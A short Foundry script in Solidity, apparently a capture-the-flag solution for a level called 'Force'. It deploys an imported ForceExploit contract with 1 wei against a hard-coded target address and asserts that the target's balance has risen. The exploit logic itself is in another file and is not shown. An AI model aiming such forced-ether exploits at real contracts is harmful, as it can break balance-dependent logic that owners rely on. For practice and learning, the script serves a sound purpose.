// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {ForceExploit} from "../src/Force.e.sol";

contract ForceScript is Script {
    address target = 0xf41B47c54dEFF12f8fE830A411a09D865eBb120E;

    function run() public {
        vm.startBroadcast();
        new ForceExploit{value: 1 wei}(payable(target));
        assert(address(target).balance >= 1);
        vm.stopBroadcast();
    }
}
